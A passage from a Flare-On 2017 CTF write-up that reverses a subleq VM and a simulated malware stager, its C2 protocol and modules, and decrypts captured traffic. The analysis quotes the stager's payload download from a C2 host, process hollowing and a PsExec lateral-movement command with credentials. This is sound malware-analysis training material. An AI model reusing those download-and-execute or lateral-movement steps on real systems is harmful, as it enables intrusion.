style=color:#a3be8c>de(4)</span><span>', '</span><span style=color:#a3be8c>(scri</span><span>', '</span><span style=color:#a3be8c>hdy>\r</span><span>'</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>AAAAAAAA4froc </span><span style=color:#b48ead>[</span><span>'</span><span style=color:#a3be8c>&LTtitl</span><span>', '</span><span style=color:#a3be8c>ced C</span><span>', '</span><span style=color:#a3be8c>d&LT/ti</span><span>', '</span><span style=color:#a3be8c>-- Ma</span><span>', "</span><span style=color:#a3be8c>01' H</span><span>", '</span><span style=color:#a3be8c>\r\n&LTbo</span><span>', '</span><span style=color:#a3be8c>text=</span><span>', '</span><span style=color:#a3be8c>olor=</span><span>', '</span><span style=color:#a3be8c>od0="</span><span>', '</span><span style=color:#a3be8c>4froc</span><span>', '</span><span style=color:#a3be8c> titl</span><span>', '</span><span style=color:#a3be8c>thieu</span><span>', '</span><span style=color:#a3be8c>enri"</span><span>', '</span><span style=color:#a3be8c>cript</span><span>', '</span><span style=color:#a3be8c>terva</span><span>', '</span><span style=color:#a3be8c>+=7,i</span><span>', "</span><span style=color:#96b5b4>\\\\</span><span style=color:#a3be8c>n';</span><span>", '</span><span style=color:#a3be8c>+=P[i</span><span>', '</span><span style=color:#a3be8c>j-j+n</span><span>', '</span><span style=color:#a3be8c>2])j=</span><span>', '</span><span style=color:#a3be8c>nerHT</span><span>', '</span><span style=color:#a3be8c>ce(4)</span><span>', '</span><span style=color:#a3be8c>/scri</span><span>', '</span><span style=color:#a3be8c>ody>\r</span><span>'</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>AAAAAAAA5froc </span><span style=color:#b48ead>[</span><span>'</span><span style=color:#a3be8c>=titl</span><span>', '</span><span style=color:#a3be8c>bed C</span><span>', '</span><span style=color:#a3be8c>e&LT/ti</span><span>', '</span><span style=color:#a3be8c>,- Ma</span><span>', "</span><span style=color:#a3be8c>11' H</span><span>", '</span><span style=color:#a3be8c>\x0c\n&LTbo</span><span>', '</span><span style=color:#a3be8c>uext=</span><span>', '</span><span style=color:#a3be8c>nlor=</span><span>', '</span><span style=color:#a3be8c>nd0="</span><span>', '</span><span style=color:#a3be8c>5froc</span><span>', '</span><span style=color:#a3be8c>!titl</span><span>', '</span><span style=color:#a3be8c>uhieu</span><span>', '</span><span style=color:#a3be8c>dnri"</span><span>', '</span><span style=color:#a3be8c>bript</span><span>', '</span><span style=color:#a3be8c>uerva</span><span>', '</span><span style=color:#a3be8c>*=7,i</span><span>', "</span><span style=color:#a3be8c>]</span><span style=color:#96b5b4>\\</span><span style=color:#a3be8c>n';</span><span>", '</span><span style=color:#a3be8c>*=P[i</span><span>', '</span><span style=color:#a3be8c>k-j+n</span><span>', '</span><span style=color:#a3be8c>3])j=</span><span>', '</span><span style=color:#a3be8c>oerHT</span><span>', '</span><span style=color:#a3be8c>be(4)</span><span>', '</span><span style=color:#a3be8c>.scri</span><span>', '</span><span style=color:#a3be8c>ndy>\r</span><span>'</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>[...]
</span></code></pre><p>Only code with key=AAAAAAAA4froc makes most sense so it <em>must</em> be it. So we’ll assume this is how the key ends, and brute-force the byte before, and so on, and so forth. Reiterating this for all bytes, we get the first subkey to be <code>k0='t_rsaat_4froc'</code>.<p>And reiterating the exact same thing for the 2nd and 3rd base64-encoded block and we get all the subkeys:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> k0='</span><span style=color:#a3be8c>t_rsaat_4froc</span><span>'
</span><span>>>> k1='</span><span style=color:#a3be8c>hx__ayowkleno</span><span>'
</span><span>>>> k2='</span><span style=color:#a3be8c>3Oiwa_o3@a-.m</span><span>'
</span><span>>>> ''.</span><span style=color:#bf616a>join</span><span>([''.</span><span style=color:#bf616a>join</span><span>(x) </span><span style=color:#b48ead>for </span><span>x </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>zip</span><span>(k0, k1, k2)])
</span><span>'</span><span style=color:#a3be8c>th3_xOr_is_waaaay_too_w34k@flare-on.com</span><span>'
</span></code></pre><p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-11>Challenge 11</h1><h1 id=instruction-10>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>Only two challenges to go. We have some bad hombres here but you're going to get
</span><span>the keys out.
</span></code></pre><h1 id=solution-10>Solution</h1><p>This challenge was out of space! And so fun! It comes as a PE32 file named <a rel="noopener nofollow noreferrer" href=https://mega.nz/#!EdIHXLxD!ctm5aE88lVss0EafshM0APMebGDSjhEcXajC6F8GVYc target=_blank><code>covfefe.exe</code></a>.<p>The most notable string (<a rel="noopener nofollow noreferrer" href=http://bitly.com/98K8eH target=_blank>http://bitly.com/98K8eH</a>) from the PE points us nostalgically to Rick Astley timeless masterpiece, “Never Gonna Give You Up”.<p>Many other strings appear, but are weirdly aligned to one DWORD per character: <a href=/img/flareon-2017/a0e353204c9ddbd73d9a71c3c6ec53ba7c068d4ab487d43726ebfbe66aef3e8b.png target=_blank> <img alt=image_alt src=/img/flareon-2017/a0e353204c9ddbd73d9a71c3c6ec53ba7c068d4ab487d43726ebfbe66aef3e8b.png title=image_alt width=100%> </a><p>Actually <code>covfefe.exe</code> is very simple, and only asks for finding a correct password. The PE itself only:<ol><li>randomly chooses an integer in [0, 9[ and store in 0x0403008+0x110*4<li>starts the VM itself at 0x0403008, and jumps to it</ol><p>The VM is an array of <code>int32_t</code> so <code>logique_addr_in_pe = 0x0403008 + relative_addr_in_vm*4</code><p>The execution of the virtual machine starts at <code>pc_start = vm + 0x463</code>. And each instruction is executed in the same way:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>execute_instruction(operand1, operand2, operand3) {
</span><span>  [operand2] = [operand2] - [operand1]
</span><span>  if [operand2] <= 0 && operand3 != -1:
</span><span>     pc = op3  // jump_to
</span><span>}
</span></code></pre><p>Since the code is super easy, I decided to recreate the C source code from it. So first, I used WinDBG to dump the VM location:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>0:000> .writemem F:\flareon_2017\11\dumpmem-00403000-L5000.dmp
</span></code></pre><p>And used this to create a <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/12ffb0aaacbf87db3247ad1a07acb13c#file-cov-c target=_blank>C script</a> that would run the VM as well. The reason for that is that now I can set breakpoint and analyse the VM more precisely. I also used Binary Ninja to write <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/12ffb0aaacbf87db3247ad1a07acb13c#file-binja-covfefe-py target=_blank>a new custom architecture</a>. The reason for that being that it greatly helped tracking down operations at the bytecode level of the VM.</p><a href=/img/flareon-2017/202dd92a07c692ff036fd5b27d7ff1c85f1af93cd33007abf2fb31bd44498270.png target=_blank> <img alt=image_alt src=/img/flareon-2017/202dd92a07c692ff036fd5b27d7ff1c85f1af93cd33007abf2fb31bd44498270.png title=image_alt width=100%> </a><p>We know that we must provide a good password to validate the task. So there must be a comparison that fails as soon as a wrong character is entered. Those new tools were of great help to identify the culprit: the comparison instruction is done in the block at 0xde6.</p><a href=/img/flareon-2017/a25240fe0264b71f12bf0371e663fe5357dd0b9f6366056b34814a5bd2670e2b.png target=_blank> <img alt=image_alt src=/img/flareon-2017/a25240fe0264b71f12bf0371e663fe5357dd0b9f6366056b34814a5bd2670e2b.png title=image_alt width=100%> </a><p>Now that we know that, all I need was to use the C script to “set a breakpoint” at 0xde9 and see what value was expected. <a href=/img/flareon-2017/dc8897ca8ce6dc0a124da94b1e7e7ddf7fc442b137930a003c31875b547c3ec9.png target=_blank> <img alt=image_alt src=/img/flareon-2017/dc8897ca8ce6dc0a124da94b1e7e7ddf7fc442b137930a003c31875b547c3ec9.png title=image_alt width=100%> </a><p>Knowing this, creating the brute-force script (<a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/12ffb0aaacbf87db3247ad1a07acb13c#file-cov-py target=_blank><code>cov.py</code></a>) was the next immediate step:</p><a href=/img/flareon-2017/5afbab3abc4ad96ab713f58c496eaee64e2efb5ae92760a084c6f5cf55a90caa.png target=_blank> <img alt=image_alt5 src=/img/flareon-2017/5afbab3abc4ad96ab713f58c496eaee64e2efb5ae92760a084c6f5cf55a90caa.png title=image_alt5 width=100%> </a><p>And finally recover the key to this level = <code>subleq_and_reductio_ad_absurdum</code>.<p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h1 id=challenge-12>Challenge 12</h1><h1 id=instruction-11>Instruction</h1><pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>Sorry, we don't have a challenge for you. We were hacked and we think we lost
</span><span>it. Its name was "lab10" . The attacker left one binary behind and our
</span><span>sophisticated security devices captured network traffic (pcap) that may be
</span><span>related. If you can recover the challenge from this and solve it then you win
</span><span>the Flare-On Challenge. If you can't then you do not win it.
</span></code></pre><h1 id=solution-11>Solution</h1><p>This level alone could have been an entire CTF. It came as 2 files:<ol><li>an 85KB PE32 file, <a rel="noopener nofollow noreferrer" href=https://mega.nz/#!ARJTwKTI!E2LSMjIHfh4bQDMDyfaxP8hKtYnWJ2IyEbqiRLyH7uQ target=_blank><code>coolprogram.exe</code></a><li>a 5.5MB PCAP trace, <a rel="noopener nofollow noreferrer" href=https://mega.nz/#!oZZygDab!c1pCq8ieSkTtTqkyaLk4he421AehJW18U-L_v_pa5MI target=_blank><code>20170801_1300_filtered.pcap</code></a></ol><h3 id=extracting-secondstage-exe>Extracting secondstage.exe</h3><p><code>coolprogram.exe</code> is a Borland compiled PE file that is nothing more than a stager to download and execute the real payload. Using API Monitor, we can trace that it attempts to connect to FQDN <code>maybe.suspicious.to</code>, checking also that the domain name doesn’t point to the localhost</p><a href=/img/flareon-2017/c1de5ea5895e4bb38d54167604de4dff8c75dd14d757d40b1d1992419d085232.png target=_blank> <img alt=image_alt src=/img/flareon-2017/c1de5ea5895e4bb38d54167604de4dff8c75dd14d757d40b1d1992419d085232.png title=image_alt width=100%> </a><p>The behavior seems consistent with the first TCP stream of the PCAP. However, the data received seems encoded/encrypted:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>GET /secondstage HTTP/1.1
</span><span>Accept: */*
</span><span>Accept-Language: en-us
</span><span>User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
</span><span>Host: maybe.suspicious.to
</span><span>Cache-Control: no-cache
</span><span>
</span><span>HTTP/1.0 200 OK
</span><span>Server: SimpleHTTP/0.6 Python/2.7.12
</span><span>date = Tue, 01 Aug 2017 17:04:02 GMT
</span><span>Content-type: application/octet-stream
</span><span>Content-Length: 119812
</span><span>Last-Modified: Tue, 01 Aug 2017 14:46:13 GMT
</span><span>
</span><span>7.=|...WEz.....:&.uBLA.5.su..m..>j.-....4..|.....Mu%R{.......U..(Fl.;./.....QM.G...O
</span><span>[...]
</span></code></pre><p>IDR and IDA helped identify the “real main” function to be at 0x04103DC, which performs sequentially the following operations:<ol><li>unxor the URL from memory: the URL is located at 0x04102B4 and xor-ed with 0x73<li>perform the HTTP GET request to get the <code>secondstage</code><li>decode the buffer, recovering a valid PE file, <code>secondstage.exe</code><li>invoke <code>secondstage.exe</code> by <a rel="noopener nofollow noreferrer" href=https://www.trustwave.com/Resources/SpiderLabs-Blog/Analyzing-Malware-Hollow-Processes/ target=_blank>hollowing</a> the default HTTP browser</ol><a href=/img/flareon-2017/7d5697ef3325169816f81bd29388f6575c6dd51d23d9fcf11c26dc778f29b354.png target=_blank> <img alt=image_alt src=/img/flareon-2017/7d5697ef3325169816f81bd29388f6575c6dd51d23d9fcf11c26dc778f29b354.png title=image_alt width=100%> </a><p>Instead of decoding manually the encoded response from the C2 server, we can be lazy by recovering <code>secondstage.exe</code> breaking at 0x4104C1:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>0:000> bp  0x4104C1; g
</span><span>Breakpoint 0 hit
</span><span>[...]
</span><span>0:000> !dh edx
</span><span>
</span><span>File Type: EXECUTABLE IMAGE
</span><span>FILE HEADER VALUES
</span><span>     14C machine (i386)
</span><span>       5 number of sections
</span><span>592F22F3 time date stamp Wed May 31 13:09:23 2017
</span><span>
</span><span>       0 file pointer to symbol table
</span><span>       0 number of symbols
</span><span>      E0 size of optional header
</span><span>     102 characteristics
</span><span>            Executable
</span><span>            32 bit word machine
</span><span>
</span><span>[...]
</span><span>0:000> .writemem F:\flareon_2017\12\secondstage.exe edx l1d400
</span><span>Writing 1d400 bytes...........................................................
</span></code></pre><h3 id=initial-analysis-secondstage>Initial analysis secondstage</h3><p>Thanks to CFF Explorer, one can easily edit <code>secondstage.exe</code> PE header to deactivate the randomization of the code by unsetting <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank><code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</code></a> and rebuild the header.<p><code>secondstage</code> analysis starts at 0x405220 by initializing a bunch a stuff, including loading all dynamically loaded functions into an array of points, ensuring a bit of obfuscation during static analysis, since all function calls will be performed by indirect calls. Then if the executable is run on client-side, initiates the connection to the C2 server:</p><a href=/img/flareon-2017/ae6aff7a8232b182109f61df0cd50bf78f7ce4a5f162c8c16a5591b5f0f7aecc.png target=_blank> <img alt=image_alt src=/img/flareon-2017/ae6aff7a8232b182109f61df0cd50bf78f7ce4a5f162c8c16a5591b5f0f7aecc.png title=image_alt width=100%> </a><a href=/img/flareon-2017/a06c9b431092bbd3e382f3d703dbe4828d0702f0140ee009aac3b341c145c32e.png target=_blank> <img alt=image_alt src=/img/flareon-2017/a06c9b431092bbd3e382f3d703dbe4828d0702f0140ee009aac3b341c145c32e.png title=image_alt width=100%> </a><p>Every time a packet is received the function 0x0402C50 is called for parsing the new message, and sending the answer back. The C2 is still behind the FQDN <code>maybe.suspicious.to</code> which in the PCAP file is associated to the IP address 52.0.104.200.<h3 id=reversing-the-communication-protocol>Reversing the communication protocol</h3><p>A big part of this challenge consisted in understanding the protocol, because once entirely assimilated, every piece of code would fall into place.<p>An initial glimpse into the second TCP stream of the PCAP reveils already many valuable information regarding the protocol:<ol><li>it is a non-standard (i.e. custom) binary protocol<li>it is (for most part) non encrypted<li>some parts of the header can be instantly recognized (magic=‘2017’, the size of the header, size of the data, etc.)<li>it transmits some PE code (presence of strings like “text”, “rdata”, “reloc”, “kernel32.dll”, names of methods, etc.)</ol><p>The function 0x403210 reveals a whole deal regarding the protocol: when a new packet is received, the function ensures that its length is at least 0x24 bytes, and that the first 4 bytes are equal to “2017”. This will be the aspect of the first 0x24 bytes of header:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>0000 "2017"
</span><span>0004 DataCheckSum
</span><span>0008 HeaderSize
</span><span>000c DataSize
</span><span>0010 DataSize2  // this field is explained later on
</span><span>0014 Magic_of_Module
</span></code></pre><p>What the hell are those modules? What is their magic number?<p>To understand that, I wrote a “replayer” that would spoof the C2 IP address, and replay all the packets to the instance of <code>secondstage</code>. After a few packets, the <code>!address</code> showed that some new memory areas were allocated in the address space, all with <code>PAGE_EXECUTE_READWRITE</code> permission, all starting with <code>LM...</code>. Searching for the constant 0x4d4c (‘LM’ in little endian), IDA spotted the instruction <code>004053CE cmp     edx, 4D4Ch</code>, which happens to be followed by a call to <code>Kernel32!VirtualAlloc()</code> with <code>PAGE_EXECUTE_READWRITE</code> (0x40) set for permission, then a <code>LoadLibraryA</code>. This must be it, so we can now use WinDBG to dump all those modules:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>0:000> bp 004053ce ; g
</span><span>0:000> dd ecx+poi(ecx+3c)+50 l1
</span><span>0018d2b8  00017000
</span><span>0:000> .writemem E:\secondstage-lm-&LTid>.dll ecx lpoi(ecx+poi(ecx+3c)+50)
</span><span>Writing 17000 bytes..............................................
</span></code></pre><p>8 modules were found. Each of them can be convert back to a valid PE format by replacing “LM\x00\x00” with “MZ\x00\x00”, and “NOP\x00” with “PE\x00\x00”. Finally the entry point must be xored with the value 0xABCDABCD.</p><a href=/img/flareon-2017/bbcda00a98ff78d846bfa7a6e2b0e846cdcd50a8cc7cd8b4b4a8b79f4a1b49db.png target=_blank> <img alt=image_alt src=/img/flareon-2017/bbcda00a98ff78d846bfa7a6e2b0e846cdcd50a8cc7cd8b4b4a8b79f4a1b49db.png title=image_alt width=100%> </a><h3 id=reversing-the-loadable-modules>Reversing the “Loadable Modules”</h3><p>All those modifications give us 8 DLL that are sent by the C2 and loaded in <code>secondstage</code>, with the following names in them<ol><li>r.dll<li>t.dll<li>6.dll<li>x.dll<li>z.dll<li>f.dll<li>s.dll<li>m.dll</ol><p>Using Diaphora to bin-diff those DLL showed that they are 99% similar, except for a handful of functions. So naturally I focused reversing only those functions.<p>In all DLLs (and even <code>secondstage</code>), one function could always be found doing something like:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>if </span><span>(</span><span style=color:#96b5b4>memcpy</span><span>(pkt->Magic_of_Module, magic_array_of_0x10_bytes, </span><span style=color:#d08770>0x10</span><span>)==</span><span style=color:#d08770>0</span><span>){
</span><span>  data = </span><span style=color:#96b5b4>malloc</span><span>( pkg->DataSize2 );
</span><span>  </span><span style=color:#65737e>/* process(pkt) */
</span><span>}
</span></code></pre><p>Which appears to be the function called when a packet is received, and that the “magic” field matched to the DLL. Symetrically, another function could be found, but this one to build a response packet from this module. Reversing all those modules could be summarized in the table below:<p>| Name | Magic | Description | Category | | secondstage.exe | 51298F741667D7ED2941950106F50545 | Handles basic packets handling, loads modules, sends MessageBox messages, stop process, etc. | * | | r.dll | C30B1A2DCB489CA8A724376469CF6782 | <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/RC4 target=_blank>RC4</a> implementation | CRPT | | t.dll | 38BE0F624CE274FC61F75C90CB3F5915 | Byte shuffling | CRPT | | 6.dll | BA0504FCC08F9121D16FD3FED1710E60 | Base64 (with custom alphabet) implementation | COMP| | x.dll | B2E5490D2654059BBBAB7F2A67FE5FF4 | Modified <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/XTEA target=_blank>XTEA</a> | CRPT | | z.dll | 5FD8EA0E9D0A92CBE425109690CE7DA2 | <a rel="noopener nofollow noreferrer" href=https://zlib.net target=_blank>zlib</a> | COMP | | f.dll | F47C51070FA8698064B65B3B6E7D30C6 | <em>didn’t see the need for reversing</em> | ? | | s.dll | F46D09704B40275FB33790A362762E56 | Send/Receive commands | CMD | | m.dll | A3AECCA1CB4FAA7A9A594D138A1BFBD5 | Desktop Screenshot | CMD |<p>3 types of plugin actions can be found (as detailed by 0x04025DF):<ul><li><code>CMD</code>: send and receive command to the client (get OS information, execute command in terminal, etc.)<li><code>CRPT</code>: cryptographic operation<li><code>COMP</code>: compression operation</ul><p>And here is where the header field <code>DataSize2</code> (at header+0x10) comes in handy: actions triggered by crypto or compression modules can produce an output whose length is different from the original <code>header.DataSize</code>. So the field <code>DataSize2</code> indicates the size of the output <strong>after</strong> the cryptographic or compression operation has been done. Although some crypto operations were used, the key (and IV when needed) could always be found in the message header.<p>Chaining modules together allows to create some pretty complex output (for example <code>Base64( zlib_deflate( XTEA(data) ) )</code> ), that would be absolutely impossible to reverse correctly, solely with the static analysis of the PCAP file. So if we want to reconstruct the data, we must write a parser at some point to parse the data of the PCAP (the final version of the parser can be <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/9b141827b66843ebbabc183731649f53#file-level12-py target=_blank>found here</a>).<h3 id=reconstructing-the-screen-capture>Reconstructing the screen capture</h3><a href=/img/flareon-2017/18a58c8dbdd8b039dc0b8492474e2ae4c0180ecc2e88a26f2d5708059aee9d4b.png target=_blank> <img alt=image_alt src=/img/flareon-2017/18a58c8dbdd8b039dc0b8492474e2ae4c0180ecc2e88a26f2d5708059aee9d4b.png title=image_alt width=100%> </a><p><code>m.dll</code> captures the desktop as a bitmap and send the raw data back to the C2 (uses the same function as the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd183402(v=vs.85).aspx" rel="noopener nofollow noreferrer" target=_blank>MSDN example</a>). But because it is a pure bitmap, there is no information of the dimensions of the image. In addition, the image is split in several packets, some of them are sent in plain text, like this<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>00010A26  32 30 31 37 49 d8 69 59  24 00 00 00 4c 40 00 00   2017I.iY $...L@..
</span><span>00010A36  4c 40 00 00 51 29 8f 74  16 67 d7 ed 29 41 95 01   L@..Q).t .g..)A..
</span><span>00010A46  06 f5 05 45 1c 00 00 00  30 40 00 00 30 40 00 00   ...E.... 0@..0@..
</span><span>00010A56  f3 71 26 ad 88 a5 61 7e  af 06 00 0d 42 4c 5a 21   .q&...a~ ....BLZ!
</span><span>00010A66  17 04 17 20 03 00 00 00  51 00 00 00 00 00 00 00   ... .... Q.......
</span><span>00010A76  00 00 00 00 a3 ae cc a1  cb 4f aa 7a 9a 59 4d 13   ........ .O.z.YM.
</span><span>00010A86  8a 1b fb d5 00 00 01 00  38 d1 0f 00 00 40 00 00   ........ 8....@..
</span><span>00010A96  f7 f7 f7 f7 f7 f7 f7 f7  f7 f7 f7 f7 f7 f7 f7 f7   ........ ........
</span><span>00010AA6  f7 f7 f7 f7 f7 f7 f7 f7  f7 f7 f7 f7 f7 f7 f7 f7   ........ ........
</span><span>00010AB6  f7 f7 f7 f7 f7 f7 f7 f7  f7 f7 f7 f7 f7 f7 f7 f7   ........ ........
</span><span>[...]
</span></code></pre><p>Whereas others are compressed and/or encrypted by the different algorithms mentioned above. However, they are all sent sequentially. Once all the fragments extracted by the parser, they were merged into a raw file. Thanks to a good tip by <i class="fa fa-twitter"> alex_k_polyakov</i>, I used the website <a rel="noopener nofollow noreferrer" href=http://rawpixels.net target=_blank>RawPixels.net</a>, and when setting a resolution of 1420x720, the following capture showed up:</p><a href=/img/flareon-2017/018ab4320dc95fa3b751227369cd27f7ee759579323d695c2453bcf9966179e0.png target=_blank> <img alt=image_alt6 src=/img/flareon-2017/018ab4320dc95fa3b751227369cd27f7ee759579323d695c2453bcf9966179e0.png title=image_alt6 width=100%> </a><p>After all those efforts, finally a good lead on the challenge to find.<h3 id=more-loadable-modules>More Loadable Modules !!</h3><p>Continuing the replay of packets showed something very interesting:</p><a href=/img/flareon-2017/01c609d44427749a2caa64d7cb8ae54f41788be7313e2c94fd9cd8f65476cc9c.png target=_blank> <img alt=image_alt src=/img/flareon-2017/01c609d44427749a2caa64d7cb8ae54f41788be7313e2c94fd9cd8f65476cc9c.png title=image_alt width=100%> </a><p><code>secondstage.exe</code> was sending commands to a child process <code>cmd.exe</code>, attempting to reach a host whose NetBIOS name is <code>larryjohnson-pc</code>, and if found, would run drop 2 files in <code>C:\staging</code>, <code>pse.exe</code> and <code>srv2.exe</code>. Finally it would execute the command:<pre class=language-bat data-lang=bat style=color:#c0c5ce;background-color:#2b303b><code class=language-bat data-lang=bat><span>pse.exe \\larryjohnson-pc -i -c -f -d -u larry.johnson -p n3v3rgunnag1veUup -accepteula srv2.exe
</span></code></pre><p><code>pse.exe</code> is nothing more than <a rel="noopener nofollow noreferrer" href=https://docs.microsoft.com/en-us/sysinternals/downloads/psexec target=_blank><code>SysInternals PsExec</code></a>, so the command would push and execute <code>srv2.exe</code> as the user <code>larry.johnson</code>. If all went well, <code>secondstage.exe</code> then attempts to load a new Loadable Module, <code>p.dll</code>, whose magic is 77D6CE92347337AEB14510807EE9D7BE. This DLL will be used to proxy the packets from/to the C2 directly to <code>srv2.exe</code> via <code>secondstage.exe</code>. In addition, the C2 then sends a few new Loadable Modules to the running <code>srv2.exe</code> process:<p>| Name | Magic | Description | Category | | b.dll | 2965E4A19B6E9D9473F5F54DFEF93533 | Blowfish implementation (CBC Mode) | CRPT | | e.dll | 8746E7B7B0C1B9CF3F11ECAE78A3A4BC | Block XOR | CRPT | | d.dll | 46C5525904F473ACE7BB8CB58B29968A | DES implementation (CBC Mode) | CRPT | | c.dll | 9B1F6EC7D9B42BF7758A094A2186986B | Camellia implementation (ECB Mode) | CRPT | | a.dll | 503B6412C75A7C7558D1C92683225449 | ApLib compression | COMP | | l.dll | 0A7874D2478A7713705E13DD9B31A6B1 | LZO compression | COMP |<p><a href=https://blahcat.github.io/2017-10-13-flareon-4-writeups/#menu>Back to Menu</a><h3 id=smart-parsing-of-the-pcap>Smart parsing of the PCAP</h3><p>It is altogether 15 Loadable Modules that are needed to be implemented for decompression or decryption. In some cases, the implementation of the algorithm was not standard (for example RC4), so I had to rewrite from scratch according to the reversed DLL solely. Particularly the ApLib module was a pain to use properly.<p>But it was critical that our implementation strictly stick to the one from the module. So a lot (really a lot) of testing was required all the time, as even a one byte mistake could make the content of a packet unreadable for the upper layer, leading to not be able to decrypt files later on…<p>But after some long hours perfecting the decrypting script, <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/9b141827b66843ebbabc183731649f53#file-level12-py target=_blank>the result</a> pays off directly, and all traffic is now in plain text, revealing some crispy information:</p><a href=/img/flareon-2017/0d1da3b02573a0f2c451b9cf801355666639e4454e26ea138b1836bdd969b36e.png target=_blank> <img alt=image_alt src=/img/flareon-2017/0d1da3b02573a0f2c451b9cf801355666639e4454e26ea138b1836bdd969b36e.png title=image_alt width=100%> </a><a href=/img/flareon-2017/54e0782509ce641e04edd2b4bb2fef3d80f31c6640451952464ff9d50b5cb851.png target=_blank> <img alt=image_alt src=/img/flareon-2017/54e0782509ce641e04edd2b4bb2fef3d80f31c6640451952464ff9d50b5cb851.png title=image_alt width=100%> </a><p>2 new files can be found from the extract:<ol><li><code>cf.exe</code> a C# compiled file<li>a 561972 byte file beginning with the pattern <code>cryp</code></ol><p><code>cf.exe</code> doesn’t show much mystery: it takes 2 parameters, a path to file, and a base64 encoded key. And it will AES encrypt the file with the given key.</p><a href=/img/flareon-2017/0fbe4ce9c0d1295088fa6938b36081272c976a99ca80fef5f27ec3c89ea0cafb.png target=_blank> <img alt=image_alt src=/img/flareon-2017/0fbe4ce9c0d1295088fa6938b36081272c976a99ca80fef5f27ec3c89ea0cafb.png title=image_alt width=100%> </a><p>As seen in the capture above, we were capable of decrypting the packet that holds the command used for encrypting the file.<pre class=language-bat data-lang=bat style=color:#c0c5ce;background-color:#2b303b><code class=language-bat data-lang=bat><span>c:\staging\cf.exe lab10.zip tCqlc2+fFiLcuq1ee1eAPOMjxcdijh8z0jrakMA/jxg=
</span></code></pre><p>So we can build a decryptor in few lines of Python<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>base64, sys, hashlib, struct
</span><span style=color:#b48ead>from </span><span>Crypto </span><span style=color:#b48ead>import </span><span>Random
</span><span style=color:#b48ead>from </span><span>Crypto.Cipher </span><span style=color:#b48ead>import </span><span style=color:#bf616a>AES
</span><span>
</span><span style=color:#bf616a>BLOCK_SIZE </span><span>= </span><span style=color:#d08770>32
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>p32</span><span>(</span><span style=color:#bf616a>x</span><span>): </span><span style=color:#b48ead>return </span><span>struct.</span><span style=color:#bf616a>pack</span><span>("</span><span style=color:#a3be8c>&LTI</span><span>",x)
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>u32</span><span>(</span><span style=color:#bf616a>x</span><span>): </span><span style=color:#b48ead>return </span><span>struct.</span><span style=color:#bf616a>unpack</span><span>("</span><span style=color:#a3be8c>&LTI</span><span>",x)[</span><span style=color:#d08770>0</span><span>]
</span><span>
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>decrypt</span><span>(</span><span style=color:#bf616a>encrypted</span><span>, </span><span style=color:#bf616a>passphrase</span><span>, </span><span style=color:#bf616a>iv</span><span>):
</span><span>    aes = AES.</span><span style=color:#bf616a>new</span><span>(passphrase, </span><span style=color:#bf616a>AES</span><span>.</span><span style=color:#bf616a>MODE_CBC</span><span>, iv)
</span><span>    </span><span style=color:#b48ead>return </span><span>aes.</span><span style=color:#bf616a>decrypt</span><span>(encrypted)
</span><span>
</span><span style=color:#b48ead>if </span><span>__name__ == "</span><span style=color:#a3be8c>__main__</span><span>":
</span><span>    data = </span><span style=color:#96b5b4>open</span><span>(sys.argv[</span><span style=color:#d08770>1</span><span>]).</span><span style=color:#bf616a>read</span><span>()
</span><span>    </span><span style=color:#96b5b4>print</span><span>("</span><span style=color:#a3be8c>[+] data_size = 0x</span><span style=color:#d08770>%x</span><span>" % </span><span style=color:#96b5b4>len</span><span>(data))
</span><span>    key = base64.</span><span style=color:#bf616a>b64decode</span><span>("</span><span style=color:#a3be8c>tCqlc2+fFiLcuq1ee1eAPOMjxcdijh8z0jrakMA/jxg=</span><span>")
</span><span>    i = data.</span><span style=color:#bf616a>find</span><span>("</span><span style=color:#a3be8c>cryp</span><span>")
</span><span>    i += </span><span style=color:#d08770>4
</span><span>    iv = data[i:i+</span><span style=color:#d08770>0x10</span><span>]
</span><span>    </span><span style=color:#96b5b4>print</span><span>("</span><span style=color:#a3be8c>[+] iv: </span><span style=color:#d08770>%s</span><span>" % iv.</span><span style=color:#bf616a>encode</span><span>('</span><span style=color:#a3be8c>hex</span><span>'))
</span><span>    i += </span><span style=color:#d08770>0x10
